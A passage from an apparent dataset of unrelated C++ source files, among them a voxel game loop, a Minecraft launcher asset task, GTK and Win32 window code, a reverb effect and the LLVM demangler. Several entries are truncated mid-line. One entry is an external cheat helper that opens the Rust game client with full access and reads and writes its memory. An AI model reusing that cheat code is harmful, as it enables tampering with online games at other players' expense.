// \u8ba1\u7b97\u5e27\u65f6\u95f4\n        auto current_time = glfwGetTime();\n        delta_time_ = current_time - last_frame_time_;\n        last_frame_time_ = current_time;\n        // \u8f93\u5165\n        processKeyBoardInput(this->window->window());\n        // \u4e0b\u9762\u662f\u6e32\u67d3\n        gameTick();\n        if (Config::enableImgui) {\n            ImGui_ImplOpenGL3_NewFrame();\n            ImGui_ImplGlfw_NewFrame();\n            ImGui::NewFrame();\n            ImGui::Begin(\"Debug\");\n            ImGui::Text(\"Base\");\n            ImGui::Text(\"Tick: %zu\", tick_);\n            static auto display_frame_time = delta_time_;\n            // 20\u5e27\u66f4\u65b0\u4e00\u6b21\u663e\u793a\uff0c\u9632\u6b62\u95ea\u70c1\n            if (tick_ % 20 == 0) display_frame_time = delta_time_;\n            auto current_chunk_pos = level->getChunkPos();\n            ImGui::Text(\"Frame time: %.4lf (%.2f)\", display_frame_time, 1 / display_frame_time);\n            ImGui::Text(\"Camera\");\n            ImGui::SliderFloat(\"Fov\", &Config::fov, 5.0, 100.0);\n            ImGui::Text(\"XYZ: %.3lf %.3lf %.3lf\", camera_->position_.x, camera_->position_.y, camera_->position_.z);\n\n            ImGui::Text(\"Yaw: %.3lf\", camera_->yaw_);\n            ImGui::Text(\"Pitch %.3lf\", camera_->pitch_);\n            ImGui::Text(\"Chunks\");\n            ImGui::Text(\"Chunk XZ: %d %d\", current_chunk_pos.x, current_chunk_pos.z);\n            auto stat = this->level->getChunkStats();\n            for (auto kv : stat) {\n                ImGui::Text(\"%s: %zu\", kv.first.c_str(), kv.second);\n            }\n            ImGui::End();\n        }\n        renderTick();\n        if (Config::enableImgui) {\n            ImGui::Render();\n            ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());\n        }\n    });\n}\n\nvoid GameMain::renderTick() {\n    glClearColor(0.2f, 0.3f, 0.3f, 1.0f);\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n    // \u7ed8\u5236\u4e00\u4e2a\u7b80\u5355\u7684\u6b63\u65b9\u5f62\u6765\u8c03\u8bd5\u76f8\u673a\n    this->shader->use();\n    // \u4f20\u5165\u76f8\u5173\u77e9\u9635\n    shader->setMat4(\"projection\", Config::getProjectionMatrix());\n    shader->setMat4(\"view\", this->camera_->getViewMatrix());\n    this->level->draw(shader);\n}\n\nvoid GameMain::gameTick() { tick_++; }\n\nvoid GameMain::show() { this->window->pool(); }\n\nvoid GameMain::processKeyBoardInput(GLFWwindow *window) {\n    if (glfwGetKey(window, GLFW_KEY_ESCAPE) == GLFW_PRESS) glfwSetWindowShouldClose(window, true);\n    if (glfwGetKey(window, GLFW_KEY_LEFT_ALT) == GLFW_PRESS) {\n        static auto temp_anti_shake_timer = 0;\n        temp_anti_shake_timer++;\n        if (temp_anti_shake_timer % 10 == 0) {  // 10\u5e27\u68c0\u6d4b\u4e00\u6b21\u6309\u4e0b\n            this->window->setMouseEnable(!this->enable_mouse_);\n            this->enable_mouse_ = !this->enable_mouse_;\n        }\n    }\n    GameCamera::Dir dir{GameCamera::invalid};\n    if (glfwGetKey(window, GLFW_KEY_W) == GLFW_PRESS) dir = GameCamera::forward;\n    if (glfwGetKey(window, GLFW_KEY_S) == GLFW_PRESS) dir = GameCamera::back;\n    if (glfwGetKey(window, GLFW_KEY_A) == GLFW_PRESS) dir = GameCamera::left;\n    if (glfwGetKey(window, GLFW_KEY_D) == GLFW_PRESS) dir = GameCamera::right;\n    if (glfwGetKey(window, GLFW_KEY_SPACE) == GLFW_PRESS) dir = GameCamera::up;\n    if (glfwGetKey(window, GLFW_KEY_LEFT_SHIFT) == GLFW_PRESS) dir = GameCamera::down;\n    camera_->Move(dir, (float)delta_time_ * 15.0f);\n    auto cp = camera_->position_;\n    this->level->updatePlayerPos({(int)cp.x, (int)cp.y, (int)cp.z});\n}\n\nvoid GameMain::processMouseInput(GLFWwindow *window, double x, double y) {\n    if (enable_mouse_) return;\n    static bool firstMouse = false;\n    auto current = glm::vec2(x, y);\n    static auto lastPos = glm::vec2(0.0, 0.0);\n    if (firstMouse) {\n        lastPos = curren",
    "#include \"AssetUpdateTask.h\"\n\n#include \"minecraft/AssetsUtils.h\"\n#include \"minecraft/MinecraftInstance.h\"\n#include \"minecraft/PackProfile.h\"\n#include \"net/ChecksumValidator.h\"\n\n#include \"Application.h\"\n\n#include \"net/ApiDownload.h\"\n\nAssetUpdateTask::AssetUpdateTask(MinecraftInstance* inst)\n{\n    m_inst = inst;\n}\n\nAssetUpdateTask::~AssetUpdateTask() {}\n\nvoid AssetUpdateTask::executeTask()\n{\n    setStatus(tr(\"Updating assets index...\"));\n    auto components = m_inst->getPackProfile();\n    auto profile = components->getProfile();\n    auto assets = profile->getMinecraftAssets();\n    QUrl indexUrl = assets->url;\n    QString localPath = assets->id + \".json\";\n    auto job = makeShared<NetJob>(tr(\"Asset index for %1\").arg(m_inst->name()), APPLICATION->network());\n\n    auto metacache = APPLICATION->metacache();\n    auto entry = metacache->resolveEntry(\"asset_indexes\", localPath);\n    entry->setStale(true);\n    auto hexSha1 = assets->sha1.toLatin1();\n    qDebug() << \"Asset index SHA1:\" << hexSha1;\n    auto dl = Net::ApiDownload::makeCached(indexUrl, entry);\n    auto rawSha1 = QByteArray::fromHex(assets->sha1.toLatin1());\n    dl->addValidator(new Net::ChecksumValidator(QCryptographicHash::Sha1, rawSha1));\n    job->addNetAction(dl);\n\n    downloadJob.reset(job);\n\n    connect(downloadJob.get(), &NetJob::succeeded, this, &AssetUpdateTask::assetIndexFinished);\n    connect(downloadJob.get(), &NetJob::failed, this, &AssetUpdateTask::assetIndexFailed);\n    connect(downloadJob.get(), &NetJob::aborted, this, [this] { emitFailed(tr(\"Aborted\")); });\n    connect(downloadJob.get(), &NetJob::progress, this, &AssetUpdateTask::progress);\n    connect(downloadJob.get(), &NetJob::stepProgress, this, &AssetUpdateTask::propagateStepProgress);\n\n    qDebug() << m_inst->name() << \": Starting asset index download\";\n    downloadJob->start();\n}\n\nbool AssetUpdateTask::canAbort() const\n{\n    return true;\n}\n\nvoid AssetUpdateTask::assetIndexFinished()\n{\n    AssetsIndex index;\n    qDebug() << m_inst->name() << \": Finished asset index download\";\n\n    auto components = m_inst->getPackProfile();\n    auto profile = components->getProfile();\n    auto assets = profile->getMinecraftAssets();\n\n    QString asset_fname = \"assets/indexes/\" + assets->id + \".json\";\n    // FIXME: this looks like a job for a generic validator based on json schema?\n    if (!AssetsUtils::loadAssetsIndexJson(assets->id, asset_fname, index)) {\n        auto metacache = APPLICATION->metacache();\n        auto entry = metacache->resolveEntry(\"asset_indexes\", assets->id + \".json\");\n        metacache->evictEntry(entry);\n        emitFailed(tr(\"Failed to read the assets index!\"));\n    }\n\n    auto job = index.getDownloadJob();\n    if (job) {\n        setStatus(tr(\"Getting the assets files from Mojang...\"));\n        downloadJob = job;\n        connect(downloadJob.get(), &NetJob::succeeded, this, &AssetUpdateTask::emitSucceeded);\n        connect(downloadJob.get(), &NetJob::failed, this, &AssetUpdateTask::assetsFailed);\n        connect(downloadJob.get(), &NetJob::aborted, this, [this] { emitFailed(tr(\"Aborted\")); });\n        connect(downloadJob.get(), &NetJob::progress, this, &AssetUpdateTask::progress);\n        connect(downloadJob.get(), &NetJob::stepProgress, this, &AssetUpdateTask::propagateStepProgress);\n        downloadJob->start();\n        return;\n    }\n    emitSucceeded();\n}\n\nvoid AssetUpdateTask::assetIndexFailed(QString reason)\n{\n    qDebug() << m_inst->name() << \": Failed asset index download\";\n    emitFailed(tr(\"Failed to download the assets index:\\n%1\").arg(reason));\n}\n\nvoid AssetUpdateTask::assetsFailed(QString reason)\n{\n    emitFailed(tr(\"Failed to download assets:\\n%1\").arg(reason));\n}\n\nbool AssetUpdateTask::abort()\n{\n    if (downloadJob) {\n        return downloadJob->abort();\n    } else {\n        qWarning() << \"Prematurely aborted AssetUpdateTask\";\n    }\n    return true;\n}\n",
    "#include <iostream>\n#include <iomanip>\n#include <fstream>\n#include \"FoodOrder.h\"\n#include \"FoodOrder.h\"\n\n// Cheching if header guards exist and follow convention.\n#ifndef SENECA_FOODORDER_H\n    #error \"The header guard for 'FoodOrder.h' doesn't follow the convention!\"\n#endif\n\nint cout = 0; // won't compile if headers don't follow convention regarding namespaces\n\n/* input file format: a comma separated set of fields with a consistent format of\n<Order Tag>,<Customer Name>,<Order Description>,<Price>,<Daily Special Status>\n\n<Order Tag> can be one of:\n\tI - In house order\n\tD - Delivery order\n\n<Daily Special Status> can be one of:\n\tY - Is a daily special\n\tN - Is not a daily special\n*/\n\n// TODO: write the prototype for the main function\n//         to accept command line arguments\n\n{\n\tstd::cout << \"Command Line:\\n\";\n\tstd::cout << \"--------------------------\\n\";\n\t// TODO: print the command line here, in the format\n\t//   1: first argument\n\t//   2: second argument\n\t//   3: third argument\n\t//   ...\n\n\n\tstd::cout << \"--------------------------\\n\\n\";\n\n\t// Keep a record of the In House and Delivery orders separately\n\tseneca::FoodOrder recordedDeliveryOrders[6];\n\t// Keep a count of how many orders recorded\n\tsize_t numDeliveries = 0;\n\n\tseneca::FoodOrder currentOrder;\n\n\tfor (auto day = 1; day < argc; ++day)\n\t{\n\n\t\t// Rates change from day 1 to day 2\n\t\tif (day == 1){\n\t\t\tg_taxrate = 0.13;\n\t\t\tg_dailydiscount = 1.15;\n\t\t}\n\t\telse{\n\t\t\tg_taxrate = 0.14;\n\t\t\tg_dailydiscount = 1.20;\n\t\t}\n\n\t\t// each parameter contains the orders from one day, process each one at a time\n\t\tstd::cout << \"--------------------\\n\";\n\t\tstd::cout << \"    Day \" << day << '\\n';\n\t\tstd::cout << \"--------------------\\n\";\n\t\tstd::cout << \"Name          |Order Description        |Price w/Tax |Special Price\" << std::endl;\n\t\tstd::ifstream in(argv[day]);\n\t\tif (in.is_open() == false)\n\t\t{\n\t\t\tstd::cout << \"Cannot open file [\" << argv[day] << \"]. Ignoring it!\\n\";\n\t\t\tcontinue; // go to the next iteration of the loop\n\t\t}\n\t\tchar ordertag = '\\0';\n\n\t\t// loop through each order in the file\n\t\twhile (in) {\n\n\t\t\t\t// read in the ordertag\n\t\t\t\tin >> ordertag;\n\t\t\t\t// skip the delimiter\n\t\t\t\tin.ignore();\n\n\t\t\t\t// end of the file\n\t\t\t\tif (in.fail())\n\t\t\t\t\tbreak;\n\n\t\t\t\t// read in the rest of the data as a FoodOrder\n\t\t\t\tcurrentOrder.read(in);\n\n\t\t\t\t// Handle the in house and delivery orders differently\n\t\t\t\tif (ordertag == 'I') {\n\t\t\t\t\tseneca::FoodOrder copy = currentOrder;\n\t\t\t\t\tcopy.display();\n\t\t\t\t}\n\t\t\t\telse if (ordertag == 'D'){ // adds the delivery orders to the record\n\t\t\t\t\trecordedDeliveryOrders[numDeliveries++] = currentOrder;\n\t\t\t\t\tcurrentOrder.display();\n\t\t\t\t}\n\t\t}\n\t}\n\n\t// print the recorded orders\n\tstd::cout << \"--------------------\\n\";\n\tstd::cout << \"Recorded Delivery Food Orders\\n\";\n\tstd::cout << \"--------------------\\n\";\n\tstd::cout << \"Name          |Order Description        |Price w/Tax |Special Price\" << std::endl;\n\tfor (auto i = 0u; i < numDeliveries; ++i)\n\t\trecordedDeliveryOrders[i].display();\n\tstd::cout << \"--------------------\\n\";\n\n\treturn cout;\n}\n",
    "#include \"ChooserDialog.h\"\n\nvoid ChooserDialog::init(GtkFileChooserAction action, string title, string cancel_name, string accept_name) {\n    window = gtk_window_new(GTK_WINDOW_TOPLEVEL);\n    gtk_window_set_title(GTK_WINDOW(window), title.c_str());\n\n    dialog = gtk_file_chooser_dialog_new(title.c_str(),\n                                         GTK_WINDOW(window),\n                                         action,\n                                         cancel_name.c_str(),\n                                         GTK_RESPONSE_CANCEL,\n                                         accept_name.c_str(),\n                                         GTK_RESPONSE_ACCEPT,\n                                         NULL);\n}\nstring ChooserDialog::run() {\n    string path;\n    res = gtk_dialog_run(GTK_DIALOG(dialog));\n    if (res == GTK_RESPONSE_ACCEPT) {\n        GtkFileChooser *chooser = GTK_FILE_CHOOSER(dialog);\n        path = gtk_file_chooser_get_filename(chooser);\n    } else if (res == GTK_RESPONSE_CANCEL) {\n        gtk_widget_destroy(dialog);\n        throw runtime_error(\"The user has closed the path selection window\");\n    } else {\n        gtk_widget_destroy(dialog);\n        throw runtime_error(\"[!] Unexpected error\");\n    }\n\n    gtk_widget_destroy(dialog);\n\n    return path;\n}",
    "#include \"textresource.h\"\n#include \"stringutils.h\"\n\nnamespace plutobook {\n\nRefPtr<TextResource> TextResource::create(const Url& url, const std::string& mimeType, const std::string& textEncoding, std::vector<char> content)\n{\n    auto text = decode(content.data(), content.size(), mimeType, textEncoding);\n    if(text.empty())\n        return nullptr;\n    return adoptPtr(new TextResource(std::move(text)));\n}\n\nstd::string TextResource::decode(const char* data, size_t length, const std::string_view& mimeType, const std::string_view& textEncoding)\n{\n    return std::string(data, length);\n}\n\nbool TextResource::isXMLMIMEType(const std::string_view& mimeType)\n{\n    if(equals(mimeType, \"text/xml\", false)\n        || equals(mimeType, \"application/xml\", false)\n        || equals(mimeType, \"text/xsl\", false)) {\n        return true;\n    }\n\n    auto length = mimeType.length();\n    if(length < 7) {\n        return false;\n    }\n\n    if(mimeType[0] == '/' || mimeType[length - 5] == '/' || !endswith(mimeType, \"+xml\", false)) {\n        return false;\n    }\n\n    bool hasSlash = false;\n    for(int i = 0; i < length - 4; ++i) {\n        auto cc = mimeType[i];\n        if(isAlnum(cc))\n            continue;\n        switch (cc) {\n        case '_':\n        case '-':\n        case '+':\n        case '~':\n        case '!':\n        case '$':\n        case '^':\n        case '{':\n        case '}':\n        case '|':\n        case '.':\n        case '%':\n        case '\\'':\n        case '`':\n        case '#':\n        case '&':\n        case '*':\n            continue;\n        case '/':\n            if(hasSlash)\n                return false;\n            hasSlash = true;\n            continue;\n        default:\n            return false;\n        }\n    }\n\n    return true;\n}\n\n} // namespace plutobook\n",
    "#include <Windows.h>\r\n#include <winternl.h>\r\n#include <Psapi.h>\r\n#include \"um.h\"\r\nbool cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_meth_setup( ) {HANDLE ss = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, NULL );if ( ss ) {HANDLE process = NULL;PROCESSENTRY32 pe;pe.dwSize = sizeof( PROCESSENTRY32 );if ( Process32First( ss, &pe ) ) {do {if ( !wcscmp( pe.szExeFile, ( L\"RustClient.exe\" ) ) ) {process = OpenProcess( PROCESS_ALL_ACCESS, false, pe.th32ProcessID );}} while ( Process32Next( ss, &pe ) );}CloseHandle( ss );crazy_process_handle = process;}return crazy_process_handle;}\r\nvoid cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read( uintptr_t address, void* buffer, size_t size ) {if (crazy_process_handle )ReadProcessMemory(crazy_process_handle, ( LPCVOID )address, buffer, size, 0 );}\r\nvoid cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_write( uintptr_t address, void* buffer, size_t size ) {if (crazy_process_handle )WriteProcessMemory(crazy_process_handle, ( LPVOID )address, &buffer, size, NULL );}\r\ncant_remove_due_to_strict_nda::crazy_material_dumper::crazymodule_t cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_get_module( const std::wstring& name ) {crazymodule_t mod = { 0 };HANDLE ss = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, GetProcessId(crazy_process_handle ) );if ( ss ) {MODULEENTRY32 me;me.dwSize = sizeof( MODULEENTRY32 );if ( Module32First( ss, &me ) ) {do {if ( !wcscmp( me.szModule, name.data( ) ) ) {mod.crazy_base = ( uint64_t )me.modBaseAddr;mod.crazy_size = ( uint64_t )me.modBaseSize;break;}} while ( Module32Next( ss, &me ) );}CloseHandle( ss );}return mod;}",
    "#include \"fmt_eigen.h\"\n#include \"fmt/color.h\"\nint main() {\n    Eigen::Matrix<double, 2, 2> matrix;\n    matrix << 1.234567, 2.345678, 3.456789, 4.567890;\n\n    Eigen::Matrix<double, 2, 2> transposed = matrix.transpose();\n    Eigen::Vector3d vec(1, 2, 3);\n\n    fmt::print(\"Matrix:\\n{}\\n vector:\\n{}\\n\", matrix, vec);\n    fmt::print(\"Matrix:\\n{0:.3f}\\n vector:\\n{1:.4f}\\n\", matrix, vec); // Specify precision of 4\n\n    fmt::print(\"Matrix Transposed:\\n{:.4f}\\n\", transposed); // Specify precision of 4\n    fmt::print(\"Matrix col or row:\\n{:.4f}\\n\", matrix.col(0)); // Specify precision of 4\n    fmt::print(\"Matrix Bolck:\\n{}\\n\", matrix.block<1,1>(0,0)); // Specify precision of 4\n    fmt::print(\"Matrix Diagonal:\\n{}\\n\", matrix.diagonal()); // Specify precision of 4\n\n    fmt::print(fg(fmt::color::steel_blue), \"Matrix:\\n{}\\n vector:\\n{}\\n\", matrix, vec);\n    fmt::print(bg(fmt::color::lime_green)|fg(fmt::color::indian_red),\n               \"Matrix:\\n{0:.3f}\\n vector:\\n{1:.4f}\\n\", matrix, vec);\n    fmt::print(fg(fmt::color::gold)|fmt::emphasis::blink, \"Matrix Transposed:\\n{:.4f}\\n\", transposed);\n    fmt::print(fg(fmt::color::steel_blue)|fmt::emphasis::bold, \"Matrix Transposed:\\n{:.4f}\\n\", transposed);\n\n    getchar();\n    return 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"daisysp.h\"\n#include \"daisy_seed.h\"\n\n// Interleaved audio definitions\n#define LEFT (i)\n#define RIGHT (i + 1)\n\nusing namespace daisysp;\nusing namespace daisy;\n\nstatic DaisySeed hw;\n\n// Number of delay lines\n#define DEL_NUM 4U\n\n// Declare FDN DelayLines\nstatic DelayLine<float, 4999U + 1U> FDN_del[DEL_NUM];\n\n// Declare LPF DelayLines\nstatic DelayLine<float, 1U> lpf_del[DEL_NUM];\n\n// Declare APF DelayLines\nstatic DelayLine<float, 557U + 1U> apf_del[DEL_NUM];\n\n// FDN feedback matrix - 4x4\nconst signed char hadamard_matrix[DEL_NUM][DEL_NUM] = {\n{  1,  1,  1,  1  },\n{ -1,  1, -1,  1  },\n{ -1, -1,  1,  1  },\n{  1, -1, -1,  1  }\n};\n\n// Matrix scalar for Hadamard\n#define MATRIX_SCALAR 0.5f\n\n// Number of primes\n#define PRIMES_NUM 669\n\nconst unsigned short primes[PRIMES_NUM] = {\n2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,211,223,227,229,233,239,241,251,257,263,269,271,277,281,283,293,307,311,313,317,331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,421,431,433,439,443,449,457,461,463,467,479,487,491,499,503,509,521,523,541,547,557,563,569,571,577,587,593,599,601,607,613,617,619,631,641,643,647,653,659,661,673,677,683,691,701,709,719,727,733,739,743,751,757,761,769,773,787,797,809,811,821,823,827,829,839,853,857,859,863,877,881,883,887,907,911,919,929,937,941,947,953,967,971,977,983,991,\n997,1009,1013,1019,1021,1031,1033,1039,1049,1051,1061,1063,1069,1087,1091,1093,1097,1103,1109,1117,1123,1129,1151,1153,1163,1171,1181,1187,1193,1201,1213,1217,1223,1229,1231,1237,1249,1259,1277,1279,1283,1289,1291,1297,1301,1303,1307,1319,1321,1327,1361,1367,1373,1381,1399,1409,1423,1427,1429,1433,1439,1447,1451,1453,1459,1471,1481,1483,1487,1489,1493,1499,1511,1523,1531,1543,1549,1553,1559,1567,1571,1579,1583,1597,1601,1607,1609,1613,1619,1621,1627,1637,1657,1663,1667,1669,1693,1697,1699,1709,1721,1723,1733,1741,1747,1753,1759,1777,1783,1787,1789,1801,1811,1823,1831,1847,1861,1867,1871,1873,1877,1879,1889,1901,1907,1913,1931,1933,\n1949,1951,1973,1979,1987,1993,1997,1999,2003,2011,2017,2027,2029,2039,2053,2063,2069,2081,2083,2087,2089,2099,2111,2113,2129,2131,2137,2141,2143,2153,2161,2179,2203,2207,2213,2221,2237,2239,2243,2251,2267,2269,2273,2281,2287,2293,2297,2309,2311,2333,2339,2341,2347,2351,2357,2371,2377,2381,2383,2389,2393,2399,2411,2417,2423,2437,2441,2447,2459,2467,2473,2477,2503,2521,2531,2539,2543,2549,2551,2557,2579,2591,2593,2609,2617,2621,2633,2647,2657,2659,2663,2671,2677,2683,2687,2689,2693,2699,2707,2711,2713,2719,2729,2731,2741,2749,2753,2767,2777,2789,2791,2797,2801,2803,2819,2833,2837,2843,2851,2857,2861,2879,2887,2897,2903,2909,2917,2927,\n2939,2953,2957,2963,2969,2971,2999,3001,3011,3019,3023,3037,3041,3049,3061,3067,3079,3083,3089,3109,3119,3121,3137,3163,3167,3169,3181,3187,3191,3203,3209,3217,3221,3229,3251,3253,3257,3259,3271,3299,3301,3307,3313,3319,3323,3329,3331,3343,3347,3359,3361,3371,3373,3389,3391,3407,3413,3433,3449,3457,3461,3463,3467,3469,3491,3499,3511,3517,3527,3529,3533,3539,3541,3547,3557,3559,3571,3581,3583,3593,3607,3613,3617,3623,3631,3637,3643,3659,3671,3673,3677,3691,3697,3701,3709,3719,3727,3733,3739,3761,3767,3769,3779,3793,3797,3803,3821,3823,3833,3847,3851,3853,3863,3877,3881,3889,3907,3911,3917,3919,3923,3929,3931,3943,3947,3967,3989,4001,\n4003,4007,4013,4019,4021,4027,4049,4051,4057,4073,4079,4091,4093,4099,4111,4127,4129,4133,4139,4153,4157,4159,4177,4201,4211,4217,4219,4229,4231,4241,4243,4253,4259,4261,4271,4273,4283,4289,4297,4327,4337,4339,4349,4357,4363,4373,4391,4397,4409,4421,4423,4441,4447,4451,4457,4463,4481,4483,4493,4507,4513,4517,4519,4523,4547,4549,4561,4567,4583,4591,4597,4603,4621,4637,4639,4643,4649,4651,4657,4663,4673,4679,4691,4703,4721,4723,4729,4733,4751,4759,4783,4787,4789,4793,4799,4801,4813,4817,4831,4861,4871,4877,4889,4903,4909,4919,4931,4933,4937,4943,4951,4957,4967,4969,4973,4987,4993,4999\n};\n\nunsigned int selectedPrimes[DEL_NUM];\n\n// G gains\nfloat g[DEL_NUM] = {0.805f, 0.827f, 0.783f, 0.764f};\n\nfloat u, sig_out;\nfloat lpf_y[DEL_NUM];\nfloat apf_del_out, apf_feedback, apf_y; //[DEL_NUM];\nfloat FDN_del_out[DEL_NUM]; // delay outs\nfloat FDN_feedback;\nunsigned char idx, r, c; // for-loop variables\n\nfloat wetCV;\nfloat lengthCV;\nfloat densityCV;\n\n\nstatic void AudioCallback(AudioHandle::InterleavingInputBuffer  in,\n                          AudioHandle::InterleavingOutputBuffer out,\n                          size_t                                size)\n{\n\n    for(size_t i = 0; i < size; i += 2)\n    {\n\n        u = 0.5f * (in[LEFT] + in[RIGHT]); // mono input\n\n        // Process delay outs and output signal\n        sig_out = 0.0f;\n        for(idx = 0; idx < DEL_NUM; idx++){\n            FDN_del_out[idx] = FDN_del[idx].Read();\n            sig_out += FDN_del_out[idx] / 4.0f;\n\n\t\t\t// LPF\n            lpf_y[idx] = (0.8f * FDN_del_out[idx]) + (0.2f * lpf_del[idx].Read());\n            lpf_del[idx].Write(lpf_y[idx]);\n\n\t\t\t// APF\n\t\t\t//apf_del_out = apf",
    "//===- MicrosoftDemangle.cpp ----------------------------------------------===//\n//\n// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n//\n//===----------------------------------------------------------------------===//\n//\n// This file defines a demangler for MSVC-style mangled symbols.\n//\n// This file has no dependencies on the rest of LLVM so that it can be\n// easily reused in other programs such as libcxxabi.\n//\n//===----------------------------------------------------------------------===//\n\n#include \"MicrosoftDemangle.h\"\n\n#include \"Demangle.h\"\n#include \"DemangleConfig.h\"\n#include \"MicrosoftDemangleNodes.h\"\n#include \"StringViewExtras.h\"\n#include \"Utility.h\"\n\n#include <array>\n#include <cctype>\n#include <cstdio>\n#include <string_view>\n#include <tuple>\n\nusing namespace llvm;\nusing namespace ms_demangle;\n\nstatic bool startsWithDigit(std::string_view S) {\n  return !S.empty() && std::isdigit(S.front());\n}\n\nstruct NodeList {\n  Node *N = nullptr;\n  NodeList *Next = nullptr;\n};\n\nstatic bool consumeFront(std::string_view &S, char C) {\n  if (!llvm::itanium_demangle::starts_with(S, C))\n    return false;\n  S.remove_prefix(1);\n  return true;\n}\n\nstatic bool consumeFront(std::string_view &S, std::string_view C) {\n  if (!llvm::itanium_demangle::starts_with(S, C))\n    return false;\n  S.remove_prefix(C.size());\n  return true;\n}\n\nstatic bool isMemberPointer(std::string_view MangledName, bool &Error) {\n  Error = false;\n  const char F = MangledName.front();\n  MangledName.remove_prefix(1);\n  switch (F) {\n  case '$':\n    // This is probably an rvalue reference (e.g. $$Q), and you cannot have an\n    // rvalue reference to a member.\n    return false;\n  case 'A':\n    // 'A' indicates a reference, and you cannot have a reference to a member\n    // function or member.\n    return false;\n  case 